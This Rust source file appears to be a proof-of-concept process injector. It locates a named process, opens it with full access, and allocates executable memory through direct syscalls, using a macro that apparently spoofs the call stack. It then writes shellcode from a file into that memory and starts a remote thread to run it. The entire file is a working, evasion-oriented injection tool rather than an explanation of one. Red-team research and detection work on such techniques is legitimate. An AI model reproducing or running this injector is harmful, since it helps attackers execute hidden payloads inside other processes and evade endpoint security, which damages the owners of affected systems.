use clap::Parser;
use uwd::spoof;

use winapi::{
    shared::ntstatus::STATUS_SUCCESS,
    um::{
        processthreadsapi::OpenProcess,
        winnt::{PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS},
    },
};

use windows_sys::Win32::{
    Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::{ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next}},
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
    },
};

/// Simple Injector for PoC
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// The target process name (notepad.exe)
    #[arg(long)]
    process: String,

    /// The PIC file path (shellcode.bin)
    #[arg(long)]
    file: String,
}

use winapi::ctypes::c_void;

unsafe extern "system" {
    pub fn Sw3NtAllocateVirtualMemory(
        process_handle: *mut c_void,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> i32;

    pub fn Sw3NtWriteVirtualMemory(
        process_handle: *mut c_void,
        base_address: *mut c_void,
        buffer: *const c_void,
        number_of_bytes_to_write: usize,
        number_of_bytes_written: *mut usize,
    ) -> i32;

    pub fn Sw3NtCreateThreadEx(
        thread_handle: *mut *mut c_void,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: *mut c_void,
        start_routine: *mut c_void,
        argument: *mut c_void,
        create_flags: u32,
        stack_zero_bits: u64,
        size_of_stack_commit: u64,
        size_of_stack_reserve: u64,
        bytes_buffer: *mut c_void,
    ) -> i32;
}

fn main() {
    let args = Args::parse();

    let process_name = &args.process;
    let file_path = args.file;

    let process_id = get_process_id_by_name(process_name).expect("Failed to get process ID by name");
    println!("[+] Process ID: {}", process_id);

    let shellcode_bytes = std::fs::read(file_path).expect("Failed to read path to PIC shellcode");
    let mut shellcode_address: *mut c_void = core::ptr::null_mut();
    let mut size = shellcode_bytes.len();

    // Get a handle to the target process with PROCESS_ALL_ACCESS
    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) };

    if process_handle.is_null() {
        panic!("Failed to open a handle to the target process");
    }

    println!("[+] Process handle: {:?}", process_handle);

    // Allocate memory in the target process for the shellcode
    let status = spoof!(
        Sw3NtAllocateVirtualMemory as *mut core::ffi::c_void,
        process_handle,
        &mut shellcode_address as *mut _ as *mut core::ffi::c_void,
        0,
        &mut size as *mut _ as *mut core::ffi::c_void,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    ).expect("Failed to spoof Sw3NtAllocateVirtualMemory") as usize as i32;

    println!(
        "[+] Allocated memory in the target process for the shellcode: {:p}",
        shellcode_address
    );

    if shellcode_address.is_null() || status != STATUS_SUCCESS {
        panic!("Failed to allocate memory in the target process for the shellcode");
    }

    // Write the shellcode to the target process
    let status = unsafe {
        Sw3NtWriteVirtualMemory(
            process_handle,
            shellcode_address as _,
            shellcode_bytes.as_ptr() as _,
            shellcode_bytes.len(),
            core::ptr::null_mut(),
        )
    };

    if status != STATUS_SUCCESS {
        panic!("Failed to write the image to the target process");
    }

    //For debugging
    //pause();

    // Create remote thread and execute our shellcode
    let mut thread_handle = core::ptr::null_mut();
    let status = unsafe {
        Sw3NtCreateThreadEx(
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            core::ptr::null_mut(),
            process_handle,
            core::mem::transmute(shellcode_address as usize),
            core::ptr::null_mut(),
            0,
            0,
            0,
            0,
            core::ptr::null_mut(),
        )
    };

    if status != STATUS_SUCCESS {
        panic!("Failed to start a thread in the target process");
    }

    // Close thread and process handle
    unsafe {
        CloseHandle(thread_handle as *mut _);
        CloseHandle(process_handle as *mut _);
    };
}

/// Gets the process ID by name, take process name as a parameter
fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if h_snapshot == INVALID_HANDLE_VALUE {
        return Err("Failed to call CreateToolhelp32Snapshot".to_owned());
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { core::mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
        return Err("Failed to call Process32First".to_owned());
    }

    loop {
        if convert_c_array_to_rust_string(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase()
        {
            break;
        }

        if unsafe { Process32Next(h_snapshot, &mut process_entry) } == 0 {
            return Err("Failed to call Process32Next".to_owned());
        }
    }

    return Ok(process_entry.th32ProcessID);
}


/// Converts a C null terminated String to a Rust String
pub fn convert_c_array_to_rust_string(buffer: Vec<i8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}
